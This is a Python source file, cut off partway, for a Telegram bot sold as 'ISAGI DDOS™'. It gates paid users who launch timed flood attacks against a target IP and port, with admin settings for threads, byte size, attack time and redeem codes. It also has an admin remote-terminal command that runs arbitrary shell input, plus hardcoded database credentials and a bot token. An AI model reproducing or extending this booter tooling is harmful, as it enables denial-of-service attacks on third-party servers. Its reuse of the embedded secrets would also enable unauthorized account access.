import os
import socket
import subprocess
import asyncio
import telebot
import logging

import pytz
import platform
import random
import string
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext, filters, MessageHandler
from pymongo import MongoClient
from datetime import datetime, timedelta, timezone

# Database Configuration
MONGO_URI = 'mongodb+srv://Magic:Spike@cluster0.fa68l.mongodb.net/TEST?retryWrites=true&w=majority&appName=Cluster0'
client = MongoClient(MONGO_URI)
db = client['TEST']
users_collection = db['users']
settings_collection = db['settings-V9']  # A new collection to store global settings
redeem_codes_collection = db['redeem_codes']
attack_logs_collection = db['user_attack_logs']

# Bot Configuration
TELEGRAM_BOT_TOKEN = '7976200794:AAHPhjZEQrZyoysM3GA7DsX8bJhULIVI2e0'
TOKEN = '7976200794:AAHPhjZEQrZyoysM3GA7DsX8bJhULIVI2e0'
ADMIN_USER_ID = 6353114118 
ADMIN_IDS = 6353114118
ADMIN_USER_ID = 6353114118 
COOLDOWN_PERIOD = timedelta(minutes=1) 
user_last_attack_time = {} 
user_attack_history = {}
cooldown_dict = {}
active_processes = {}
current_directory = os.getcwd()
# Initialize the bot
bot = telebot.TeleBot(TOKEN)

# Dictionary to track user attack counts, cooldowns, photo feedbacks, and bans
user_attacks = {}
allowed_user_ids = {}
user_cooldowns = {}
user_photos = {}  # Tracks whether a user has sent a photo as feedback
user_bans = {}  # Tracks user ban status and ban expiry time
reset_time = datetime.now().astimezone(timezone(timedelta(hours=5, minutes=10))).replace(hour=0, minute=0, second=0, microsecond=0)

# Cooldown duration (in seconds)
COOLDOWN_DURATION = 3  # 5 minutes
BAN_DURATION = timedelta(minutes=1)  
DAILY_ATTACK_LIMIT = 15  # Daily attack limit per user

# List of user IDs exempted from cooldown, limits, and photo requirements
EXEMPTED_USERS = [6353114118, 6353114118]

# Track active attacks
active_attacks = 0  
MAX_ACTIVE_ATTACKS = 1  # Maximum number of running attacks

def reset_daily_counts():
    """Reset the daily attack counts and other data at 12 AM IST."""
    global reset_time
    ist_now = datetime.now(timezone.utc).astimezone(timezone(timedelta(hours=5, minutes=10)))
    if ist_now >= reset_time + timedelta(days=1):
        user_attacks.clear()
        user_cooldowns.clear()
        user_photos.clear()
        user_bans.clear()
        reset_time = ist_now.replace(hour=0, minute=0, second=0, microsecond=0) + timedelta(days=1)

# Default values (in case not set by the admin)
DEFAULT_BYTE_SIZE = 900
DEFAULT_THREADS = 1200
DEFAULT_MAX_ATTACK_TIME = 300
valid_ip_prefixes = ('52.', '20.', '14.', '4.', '13.')

# Adjust this to your local timezone, e.g., 'America/New_York' or 'Asia/Kolkata'
LOCAL_TIMEZONE = pytz.timezone("Asia/Kolkata")
PROTECTED_FILES = ["e.py", "ISAGI"]
BLOCKED_COMMANDS = ['nano', 'vim', 'shutdown', 'reboot', 'rm', 'mv', 'dd']

# Fetch the current user and hostname dynamically
USER_NAME = os.getlogin()  # Get the current system user
HOST_NAME = socket.gethostname()  # Get the system's hostname

# Store the current directory path
current_directory = os.path.expanduser("~")  # Default to the home directory

# Function to get dynamic user and hostname info
def get_user_and_host():
    try:
        # Try getting the username and hostname from the system
        user = os.getlogin()
        host = socket.gethostname()

        # Special handling for cloud environments (GitHub Codespaces, etc.)
        if 'CODESPACE_NAME' in os.environ:  # GitHub Codespaces environment variable
            user = os.environ['CODESPACE_NAME']
            host = 'github.codespaces'

        # Adjust for other environments like VS Code, IntelliJ, etc. as necessary
        # For example, if the bot detects a cloud-based platform like IntelliJ Cloud or AWS
        if platform.system() == 'Linux' and 'CLOUD_PLATFORM' in os.environ:
            user = os.environ.get('USER', 'clouduser')
            host = os.environ.get('CLOUD_HOSTNAME', socket.gethostname())

        return user, host
    except Exception as e:
        # Fallback in case of error
        return 'user', 'hostname'

# Function to handle terminal commands
async def execute_terminal(update: Update, context: CallbackContext):
    global current_directory
    user_id = update.effective_user.id

    # Restrict access to admin only
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="❌ *You are not authorized to execute terminal commands!*",
            parse_mode='Markdown'
        )
        return

    # Ensure a command is provided
    if not context.args:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="⚠️ *Usage: /terminal <command>*",
            parse_mode='Markdown'
        )
        return

    # Join arguments to form the command
    command = ' '.join(context.args)

    # Check if the command starts with a blocked command
    if any(command.startswith(blocked_cmd) for blocked_cmd in BLOCKED_COMMANDS):
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"❌ *Command '{command}' is not allowed!*",
            parse_mode='Markdown'
        )
        return

    # Handle `cd` command separately to change the current directory
    if command.startswith('cd '):
        # Get the directory to change to
        new_directory = command[3:].strip()

        # Resolve the absolute path of the directory
        absolute_path = os.path.abspath(os.path.join(current_directory, new_directory))

        # Ensure the directory exists before changing
        if os.path.isdir(absolute_path):
            current_directory = absolute_path
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"📂 *Changed directory to:* `{current_directory}`",
                parse_mode='Markdown'
            )
        else:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"❌ *Directory not found:* `{new_directory}`",
                parse_mode='Markdown'
            )
        return

    try:
        # Get dynamic user and host information
        user, host = get_user_and_host()

        # Create the prompt dynamically like 'username@hostname:/current/path$'
        current_dir = os.path.basename(current_directory) if current_directory != '/' else ''
        prompt = f"{user}@{host}:{current_dir}$ "

        # Run the command asynchronously
        result = await asyncio.create_subprocess_shell(
            command,
            cwd=current_directory,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        # Capture the output and error (if any)
        stdout, stderr = await result.communicate()

        # Decode the byte output
        output = stdout.decode().strip() or stderr.decode().strip()

        # If there is no output, inform the user
        if not output:
            output = "No output or error from the command."

        # Limit the output to 4000 characters to avoid Telegram message size limits
        if len(output) > 4000:
            output = output[:4000] + "\n⚠️ Output truncated due to length."

        # Send the output back to the user, including the prompt
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"💻 *Command Output:*\n{prompt}\n```{output}```",
            parse_mode='Markdown'
        )

    except Exception as e:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"❌ *Error executing command:*\n```{str(e)}```",
            parse_mode='Markdown'
        )


async def check_status(message):
    user_id = message.from_user.id
    remaining_attacks = DAILY_ATTACK_LIMIT - user_attacks.get(user_id, 0)
    cooldown_end = user_cooldowns.get(user_id)
    cooldown_time = max(0, (cooldown_end - datetime.now()).seconds) if cooldown_end else 0
    minutes, seconds = divmod(cooldown_time, 60)  # Convert to minutes and seconds

    response = (
        "🛡️✨ *『 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙏𝙐𝙎 』* ✨🛡️\n\n"
        f"👤 *𝙐𝙨𝙚𝙧:* {message.from_user.first_name}\n"
        f"🎯 *𝙍𝙚𝙢𝙖𝙞𝙣𝙞𝙣𝙜 𝘼𝙩𝙩𝙖𝙘𝙠𝙨:* `{remaining_attacks}` ⚔️\n"
        f"⏳ *𝘾𝙤𝙤𝙡𝙙𝙤𝙬𝙣 𝙏𝙞𝙢𝙚:* `{minutes} min {seconds} sec` 🕒\n\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "🚀 *𝙆𝙀𝙀𝙋 𝙎𝙐𝙋𝙋𝙊𝙍𝙏𝙄𝙉𝙂 𝘼𝙉𝘿 𝙒𝙄𝙉 𝙏𝙃𝙀 𝘽𝘼𝙏𝙏𝙇𝙀!* ⚡"
    )
    bot.reply_to(message, response, parse_mode="Markdown")


# Add to handle uploads when replying to a file
async def upload(update: Update, context: CallbackContext):
    user_id = update.effective_user.id

    # Only allow admin
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*❌ You are not authorized to upload files!*",
            parse_mode='Markdown'
        )
        return

    # Ensure the message is a reply to a file
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*⚠️ Please reply to a file message with /upload to process it.*",
            parse_mode='Markdown'
        )
        return

    # Process the replied-to file
    document = update.message.reply_to_message.document
    file_name = document.file_name
    file_path = os.path.join(os.getcwd(), file_name)

    # Download the file
    file = await context.bot.get_file(document.file_id)
    await file.download_to_drive(file_path)

    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=f"✅ *File '{file_name}' has been uploaded successfully!*",
        parse_mode='Markdown'
    )


# Function to list files in a directory
async def list_files(update: Update, context: CallbackContext):
    user_id = update.effective_user.id

    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*❌ You are not authorized to list files!*",
            parse_mode='Markdown'
        )
        return

    directory = context.args[0] if context.args else os.getcwd()

    if not os.path.isdir(directory):
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"❌ *Directory not found:* `{directory}`",
            parse_mode='Markdown'
        )
        return

    try:
        files = os.listdir(directory)
        if files:
            files_list = "\n".join(files)
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"📂 *Files in Directory:* `{directory}`\n{files_list}",
                parse_mode='Markdown'
            )
        else:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"📂 *No files in the directory:* `{directory}`",
                parse_mode='Markdown'
            )
    except Exception as e:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"❌ *Error accessing the directory:* `{str(e)}`",
            parse_mode='Markdown'
        )


async def delete_file(update: Update, context: CallbackContext):
    user_id = update.effective_user.id

    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*❌ You are not authorized to delete files!*",
            parse_mode='Markdown'
        )
        return

    if len(context.args) != 1:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*⚠️ Usage: /delete <file_name>*",
            parse_mode='Markdown'
        )
        return

    file_name = context.args[0]
    file_path = os.path.join(os.getcwd(), file_name)

    if file_name in PROTECTED_FILES:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"⚠️ *File '{file_name}' is protected and cannot be deleted.*",
            parse_mode='Markdown'
        )
        return

    if os.path.exists(file_path):
        os.remove(file_path)
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"✅ *File '{file_name}' has been deleted.*",
            parse_mode='Markdown'
        )
    else:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"⚠️ *File '{file_name}' not found.*",
            parse_mode='Markdown'
        )
        
async def help_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id

    if user_id != ADMIN_USER_ID:
        # Help text for regular users (exclude sensitive commands)
        help_text = (
        "╔══════════════════════════╗\n"
        " 🌟 *『 𝐇𝐄𝐋𝐏 𝐌𝐄𝐍𝐔 』* 🌟\n"
        "╚══════════════════════════╝\n\n"
        "💀 *𝙏𝙃𝙀 𝘽𝙀𝙎𝙏 𝘽𝙊𝙏 𝙁𝙊𝙍 𝘿𝙊𝙈𝙄𝙉𝘼𝙏𝙄𝙊𝙉!* 💀\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🚀 *『 𝗨𝗦𝗘𝗥 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 』* 🚀\n"
        "🎮 /start - ✨ *Begin your journey!*\n"
        "📜 /help - 🏆 *View this epic menu!*\n"
        "💀 /attack - 🎯 *Launch your attack!* *(Verified users only)*\n"
        "⚡ /status - 🚀 *Check your battle status!*\n"
        "📸 *Send a Photo* - 🔥 *Submit feedback!* 🔥 \n\n"
        )
    else:
        # Help text for admins (incl  ude sensitive commands)
        help_text = (
        "╔══════════════════════════╗\n"
        "      🌟*『 ADMIN 𝐇𝐄𝐋𝐏 𝐌𝐄𝐍𝐔 』* 🌟\n"
        "╚══════════════════════════╝\n\n"
        "💀 *𝙏𝙃𝙀 𝘽𝙀𝙎𝙏 𝘽𝙊𝙏 𝙁𝙊𝙍 𝘿𝙊𝙈𝙄𝙉𝘼𝙏𝙄𝙊𝙉!* 💀\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🚀 *『 ADMIN 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 』* 🚀\n"
        "*🔥 /start* - Start the bot.\n"
        "*💥 /attack* - Start the attack.\n"
        "*😎 /add [user_id]* - Add a user.\n"
        "*💀 /remove [user_id]* - Remove a user.\n"
        "*🔥 /thread [number]* - Set number of threads.\n"
        "*💀 /byte [size]* - Set the byte size.\n"
        "*💥 /show* - Show current settings.\n"
        "*☠️ /users* - List all allowed users.\n"
        "*💥 /gen* - Generate a redeem code.\n"
        "*💀 /redeem* - Redeem a code.\n"
        "*👽 /cleanup* - Clean up stored data.\n"
        "*😊 /argument [type]* - Set the (3, 4, or 5).\n"
        "*🔴 /delete_code* - Delete a redeem code.\n"
        "*🥵 /list_codes* - List all redeem codes.\n"
        "*🥶 /set_time* - Set max attack time.\n"
        "*😎 /log [user_id]* - View attack history.\n"
        "*⚽ /delete_log [user_id]* - Delete history.\n"
        "*✨ /upload* - Upload a file.\n"
        "*🥶 /ls* - List files in the directory.\n"
        "*❤ /delete [filename]* - Delete a file.\n"
        "*😁 /terminal [command]* - Execute.\n"
        
        )
    await context.bot.send_message(chat_id=update.effective_chat.id, text=help_text, parse_mode='Markdown')

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id 

    # Check if the user is allowed to use the bot
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
        return

    message = (
        "✨🔥 *『 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 ISAGI DDOS™ 』* 🔥✨\n\n"
        "🚀 *Hello, Player!* ⚡\n"
        "🎯 *Get ready to dominate the battlefield!* 🏆\n\n"
        "💀 *𝙏𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙨 𝙙𝙚𝙨𝙞𝙜𝙣𝙚𝙙 𝙩𝙤 𝙝𝙚𝙡𝙥 𝙮𝙤𝙪 𝙖𝙩𝙩𝙖𝙘𝙠 & 𝙙𝙚𝙛𝙚𝙣𝙙!* 💀\n\n"
        "⚡ *Use* /help *to explore all commands!* 📜"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

# Handler for photos (feedback)
FEEDBACK_CHANNEL_ID = "-1002364415379"
last_feedback_photo = {}
user_photos = {}

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name
    photo_id = message.photo[-1].file_id

    if last_feedback_photo.get(user_id) == photo_id:
        response = (
            "⚠️🚨 *『 𝗪𝗔𝗥𝗡𝗜𝗡𝗚: SAME 𝗙𝗘𝗘𝗗𝗕𝗔𝗖𝗞! 』* 🚨⚠️\n\n"
            "🛑 *𝖸𝖮𝖴 𝖧𝖠𝖵𝖤 𝖲𝖤𝖭𝖳 𝖳𝖧𝖨𝖲 𝖥𝖤𝖤𝖣𝖡𝖠𝖢𝖪 𝘽𝙀𝙁𝙊𝙍𝙀!* 🛑\n"
            "📩 *𝙋𝙇𝙀𝘼𝙎𝙀 𝘼𝙑𝙊𝙄𝘿 𝙍𝙀𝙎𝙀𝙉𝘿𝙄𝙉𝙂 𝙏𝙃𝙀 𝙎𝘼𝙈𝙀 𝙋𝙃𝙊𝙏𝙊.*\n\n"
            "✅ *𝙔𝙊𝙐𝙍 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆 𝙒𝙄𝙇𝙇 𝙎𝙏𝙄𝙇𝙇 𝘽𝙀 𝙎𝙀𝙉𝙏!*"
        )
        bot.reply_to(message, response)

    last_feedback_photo[user_id] = photo_id
    user_photos[user_id] = True

    response = (
        "✨『 𝑭𝑬𝑬𝑫𝑩𝑨𝑪𝑲 𝑺𝑼𝑪𝑪𝑬𝑺𝑺𝑭𝑼𝑳𝑳𝒀 𝑹𝑬𝑪𝑬𝑰𝑽𝑬𝑫! 』✨\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        f"👤 *𝙁𝙍𝙊𝙈 𝙐𝙎𝙀𝙍:* @{username} 🏆\n"
        "📩 𝙏𝙃𝘼𝙉𝙆 𝙔𝙊𝙐 𝙁𝙊𝙍 𝙎𝙃𝘼𝙍𝙄𝙉𝙂 𝙔𝙊𝙐𝙍 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆!🎉\n"
        "━━━━━━━━━━━━━━━━━━━"
    )
    bot.reply_to(message, response)

    for admin_id in ADMIN_IDS:
        bot.forward_message(admin_id, message.chat.id, message.message_id)
        admin_response = (
            "🚀🔥 *『 𝑵𝑬𝑾 𝑭𝑬𝑬𝑫𝑩𝑨𝑪𝑲 𝑹𝑬𝑪𝑬𝑰𝑽𝑬𝑫! 』* 🔥🚀\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            f"👤 *𝙁𝙍𝙊𝙈 𝙐𝙎𝙀𝙍:* @{username} 🛡️\n"
            f"🆔 *𝙐𝙨𝙚𝙧 𝙄𝘿:* `{user_id}`\n"
            "📸 *𝙏𝙃𝘼𝙉𝙆 𝙔𝙊𝙐 𝙁𝙊𝙍 𝙔𝙊𝙐𝙍 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆!!* ⬇️\n"
            "━━━━━━━━━━━━━━━━━━━"
        )
        bot.send_message(admin_id, admin_response)

    bot.forward_message(FEEDBACK_CHANNEL_ID, message.chat.id, message.message_id)
    channel_response = (
        "🌟🎖️ *『 𝑵𝑬𝑾 𝑷𝑼𝑩𝑳𝑰𝑪 𝑭𝑬𝑬𝑫𝑩𝑨𝑪𝑲! 』* 🎖️🌟\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        f"👤 *𝙁𝙍𝙊𝙈 𝙐𝙎𝙀𝙍:* @{username} 🏆\n"
        f"🆔 *𝙐𝙨𝙚𝙧 𝙄𝘿:* `{user_id}`\n"
        "📸 *𝙐𝙎𝙀𝙍 𝙃𝘼𝙎 𝙎𝙃𝘼𝙍𝙀𝘿 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆.!* 🖼️\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "📢 *𝙆𝙀𝙀𝙋 𝙎𝙐𝙋𝙋𝙊𝙍𝙏𝙄𝙉𝙂 & 𝙎𝙃𝘼𝙍𝙄𝙉𝙂 𝙔𝙊𝙐𝙍 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆!* 💖"
    )
    bot.send_message(FEEDBACK_CHANNEL_ID, channel_response)


# Verification
verified_users = set()
PRIVATE_CHANNEL_USERNAME = "ISAGIxCRACKS"
PRIVATE_CHANNEL_LINK = "https://t.me/ISAGIxCRACKS"

@bot.message_handler(commands=['verify'])
def verify_user(message):
    user_id = message.from_user.id
    
    try:
        chat_member = bot.get_chat_member(f"@{PRIVATE_CHANNEL_USERNAME}", user_id)
        if chat_member.status in ["member", "administrator", "creator"]:
            verified_users.add(user_id)
            bot.send_message(
                message.chat.id,
                "✅✨ *𝗩𝗘𝗥𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟!* ✨✅\n\n"
                "🎉 𝗪𝗲𝗹𝗰𝗼𝗺𝗲! 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘄 𝗮 𝗩𝗲𝗿𝗶𝗳𝗶𝗲𝗱 𝗨𝘀𝗲𝗿. 🚀\n"
                "🔗 𝗬𝗼𝘂 𝗰𝗮𝗻 𝗻𝗼𝘄 𝗮𝗰𝗰𝗲𝘀𝘀 /bgmi 𝘀𝗲𝗿𝘃𝗶𝗰𝗲𝘀! ⚡"
            )
        else:
            bot.send_message(
                message.chat.id,
                f"🚨 *𝗩𝗘𝗥𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 𝗙𝗔𝗜𝗟𝗘𝗗!* 🚨\n\n"
                f"🔗 [Join our Channel]({PRIVATE_CHANNEL_LINK}) 📩\n"
                "⚠️ 𝗔𝗳𝘁𝗲𝗿 𝗷𝗼𝗶𝗻𝗶𝗻𝗴, 𝗿𝘂𝗻 /verify 𝗮𝗴𝗮𝗶𝗻.",
                parse_mode="Markdown"
            )
    except Exception:
        bot.send_message(
            message.chat.id,
            f"⚠️ *𝗘𝗿𝗿𝗼𝗿 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗬𝗼𝘂𝗿 𝗠𝗲𝗺𝗯𝗲𝗿𝘀𝗵𝗶𝗽!* ⚠️\n\n"
            f"📌 𝗠𝗮𝗸𝗲 𝘀𝘂𝗿𝗲 𝘆𝗼𝘂 𝗵𝗮𝘃𝗲 𝗷𝗼𝗶𝗻𝗲𝗱: [Click Here]({PRIVATE_CHANNEL_LINK})",
            parse_mode="Markdown"
        )

async def add_user(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to add users!*", parse_mode='Markdown')
        return

    if len(context.args) != 2:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /add <user_id> <days/minutes>*", parse_mode='Markdown')
        return

    target_user_id = int(context.args[0])
    time_input = context.args[1]  # The second argument is the time input (e.g., '2m', '5d')

    # Extract numeric value and unit from the input
    if time_input[-1].lower() == 'd':
        time_value = int(time_input[:-1])  # Get all but the last character and convert to int
        total_seconds = time_value * 86400  # Convert days to seconds
    elif time_input[-1].lower() == 'm':
        time_value = int(time_input[:-1])  # Get all but the last character and convert to int
        total_seconds = time_value * 60  # Convert minutes to seconds
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Please specify time in days (d) or minutes (m).*", parse_mode='Markdown')
        return

    expiry_date = datetime.now(timezone.utc) + timedelta(seconds=total_seconds)  # Updated to use timezone-aware UTC

    # Add or update user in the database
    users_collection.update_one(
        {"user_id": target_user_id},
        {"$set": {"expiry_date": expiry_date}},
        upsert=True
    )

    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ User {target_user_id} added with expiry in {time_value} {time_input[-1]}.*", parse_mode='Markdown')

async def remove_user(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to remove users!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /remove <user_id>*", parse_mode='Markdown')
        return

    target_user_id = int(context.args[0])
    
    # Remove user from the database
    users_collection.delete_one({"user_id": target_user_id})

    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ User {target_user_id} removed.*", parse_mode='Markdown')

async def set_thread(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to set the number of threads!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /thread <number of threads>*", parse_mode='Markdown')
        return

    try:
        threads = int(context.args[0])
        if threads <= 0:
            raise ValueError("Number of threads must be positive.")

        # Save the number of threads to the database
        settings_collection.update_one(
            {"setting": "threads"},
            {"$set": {"value": threads}},
            upsert=True
        )
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ Number of threads set to {threads}.*", parse_mode='Markdown')

    except ValueError as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*⚠️ Error: {e}*", parse_mode='Markdown')

async def set_byte(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to set the byte size!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /byte <byte size>*", parse_mode='Markdown')
        return

    try:
        byte_size = int(context.args[0])
        if byte_size <= 0:
            raise ValueError("Byte size must be positive.")

        # Save the byte size to the database
        settings_collection.update_one(
            {"setting": "byte_size"},
            {"$set": {"value": byte_size}},
            upsert=True
        )
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ Byte size set to {byte_size}.*", parse_mode='Markdown')

    except ValueError as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*⚠️ Error: {e}*", parse_mode='Markdown')

async def show_settings(update: Update, context: CallbackContext):
    # Only allow the admin to use this command
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to view settings!*", parse_mode='Markdown')
        return

    # Retrieve settings from the database
    byte_size_setting = settings_collection.find_one({"setting": "byte_size"})
    threads_setting = settings_collection.find_one({"setting": "threads"})
    argument_type_setting = settings_collection.find_one({"setting": "argument_type"})
    max_attack_time_setting = settings_collection.find_one({"setting": "max_attack_time"})

    byte_size = byte_size_setting["value"] if byte_size_setting else DEFAULT_BYTE_SIZE
    threads = threads_setting["value"] if threads_setting else DEFAULT_THREADS
    argument_type = argument_type_setting["value"] if argument_type_setting else 3  # Default to 3 if not set
    max_attack_time = max_attack_time_setting["value"] if max_attack_time_setting else 60  # Default to 60 seconds if not set

    # Send settings to the admin
    settings_text = (
        f"*Current Bot Settings:*\n"
        f"🗃️ *Byte Size:* {byte_size}\n"
        f"🔢 *Threads:* {threads}\n"
        f"🔧 *Argument Type:* {argument_type}\n"
        f"⏲️ *Max Attack Time:* {max_attack_time} seconds\n"
    )

    await context.bot.send_message(chat_id=update.effective_chat.id, text=settings_text, parse_mode='Markdown')

async def list_users(update, context):
    current_time = datetime.now(timezone.utc)
    users = users_collection.find() 
    
    user_list_message = "👥 User List:\n"
    
    for user in users:
        user_id = user['user_id']
        expiry_date = user['expiry_date']
        if expiry_date.tzinfo is None:
            expiry_date = expiry_date.replace(tzinfo=timezone.utc)
    
        time_remaining = expiry_date - current_time
        if time_remaining.days < 0:
            remaining_days = -0
            remaining_hours = 0
            remaining_minutes = 0
            expired = True  
        else:
            remaining_days = time_remaining.days
            remaining_hours = time_remaining.seconds // 3600
            remaining_minutes = (time_remaining.seconds // 60) % 60
            expired = False 
        
        expiry_label = f"{remaining_days}D-{remaining_hours}H-{remaining_minutes}M"
        if expired:
            user_list_message += f"🔴 *User ID: {user_id} - Expiry: {expiry_label}*\n"
        else:
            user_list_message += f"🟢 User ID: {user_id} - Expiry: {expiry_label}\n"

    await context.bot.send_message(chat_id=update.effective_chat.id, text=user_list_message, parse_mode='Markdown')

async def is_user_allowed(user_id):
    user = users_collection.find_one({"user_id": user_id})
    if user:
        expiry_date = user['expiry_date']
        if expiry_date:
            # Ensure expiry_date is timezone-aware
            if expiry_date.tzinfo is None:
                expiry_date = expiry_date.replace(tzinfo=timezone.utc)
            # Compare with the current time
            if expiry_date > datetime.now(timezone.utc):
                return True
    return False

# Function to set the argument type for attack commands
async def set_argument(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to set the argument!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /argument <3|4|5>*", parse_mode='Markdown')
        return

    try:
        argument_type = int(context.args[0])
        if argument_type not in [3, 4, 5]:
            raise ValueError("Argument must be 3, 4, or 5.")

        # Store the argument type in the database
        settings_collection.update_one(
            {"setting": "argument_type"},
            {"$set": {"value": argument_type}},
            upsert=True
        )

        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ Argument type set to {argument_type}.*", parse_mode='Markdown')

    except ValueError as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*⚠️ Error: {e}*", parse_mode='Markdown')

async def set_max_attack_time(update: Update, context: CallbackContext):
    """Command for the admin to set the maximum attack time allowed."""
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to set the max attack time!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /set_time <max time in seconds>*", parse_mode='Markdown')
        return

    try:
        max_time = int(context.args[0])
        if max_time <= 0:
            raise ValueError("Max time must be a positive integer.")

        # Save the max attack time to the database
        settings_collection.update_one(
            {"setting": "max_attack_time"},
            {"$set": {"value": max_time}},
            upsert=True
        )
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ Maximum attack time set to {max_time} seconds.*", parse_mode='Markdown')

    except ValueError as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*⚠️ Error: {e}*", parse_mode='Markdown')

# Function to log user attack history
async def log_attack(user_id, ip, port, duration):
    # Store attack history in MongoDB
    attack_log = {
        "user_id": user_id,
        "ip": ip,
        "port": port,
        "duration": duration,
        "timestamp": datetime.now(timezone.utc)  # Store timestamp in UTC
    }
    attack_logs_collection.insert_one(attack_log)

# Modify attack function to log attack history
async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the ID of the user
    current_time = datetime.now(timezone.utc)

    # Check if the user is allowed to use the bot
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
        return

    # Check for cooldown
    last_attack_time = cooldown_dict.get(user_id)
    if last_attack_time:
        elapsed_time = current_time - last_attack_time
        if elapsed_time < COOLDOWN_PERIOD:
